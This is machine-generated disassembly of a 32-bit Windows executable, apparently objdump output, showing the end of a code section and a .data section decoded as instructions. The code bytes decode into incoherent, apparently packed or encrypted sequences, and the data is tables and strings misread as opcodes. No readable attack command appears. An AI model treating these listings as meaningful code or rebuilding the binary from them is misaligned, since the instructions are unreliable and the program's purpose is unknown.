  4119f4:	rcr    DWORD PTR [ecx-0xfe0a896],0x7d
  4119fb:	mov    al,ds:0xe311ac64
  411a00:	inc    eax
  411a01:	mov    ah,0x7a
  411a03:	pop    esp
  411a04:	ss push 0xffffff87
  411a07:	dec    esp
  411a08:	rcl    DWORD PTR [ebx],0xc8
  411a0b:	loop   0x41199d
  411a0d:	adc    al,0x43
  411a0f:	in     al,dx
  411a10:	data16 jb 0x411a7a
  411a13:	mov    edx,0x95e40ae2
  411a18:	sbb    eax,0xf13bae94
  411a1d:	and    esp,DWORD PTR [eax+ecx*1-0x61]
  411a21:	dec    ebp
  411a22:	call   0x4aa5bda6
  411a27:	push   DWORD PTR [ecx-0x6e5faca3]
  411a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a2e:	xlat   BYTE PTR ds:[ebx]
  411a2f:	out    dx,eax
  411a30:	into   
  411a31:	jp     0x411a0a
  411a33:	(bad)  
  411a34:	push   ds
  411a35:	xor    BYTE PTR [ecx-0x2fb8dc5],0x21
  411a3c:	push   esp
  411a3d:	fimul  DWORD PTR [edx]
  411a3f:	mov    al,ah
  411a41:	jp     0x411ab2
  411a43:	cld    
  411a44:	sub    DWORD PTR [edx+0x57ea15d0],ebp
  411a4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a4b:	cli    
  411a4c:	neg    BYTE PTR [esi+0x6a]
  411a4f:	stos   BYTE PTR es:[edi],al
  411a50:	ffree  st(6)
  411a52:	add    DWORD PTR [edi],0x7643e2bb
  411a58:	iret   
  411a59:	jo     0x4119f2
  411a5b:	fwait
  411a5c:	aaa    
  411a5d:	icebp  
  411a5e:	scas   eax,DWORD PTR es:[edi]
  411a5f:	sbb    DWORD PTR [ebx+0xd],ebx
  411a62:	mov    edi,DWORD PTR [esi+0x4ae42814]
  411a68:	leave  
  411a69:	ror    DWORD PTR [ebx-0xd8750bf],1
  411a6f:	jge    0x411a4e
  411a71:	mov    ebx,0xdef29b56
  411a76:	scas   eax,DWORD PTR es:[edi]
  411a77:	loop   0x411a96
  411a79:	mov    ebp,DWORD PTR ss:[ebx+0x15]
  411a7d:	xchg   DWORD PTR [edx],ebx
  411a7f:	leave  
  411a80:	xor    al,0x26
  411a82:	pop    eax
  411a83:	sbb    al,0xc5
  411a85:	les    esi,FWORD PTR [ebp+0x2b8426d0]
  411a8b:	xor    eax,0x6a39d62b
  411a90:	test   eax,0x1fc8b837
  411a95:	jne    0x411a5e
  411a97:	mov    esi,0x8b49d117
  411a9c:	pop    eax
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [ecx+edi*1+0x3],dl
  412427:	add    BYTE PTR [ecx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
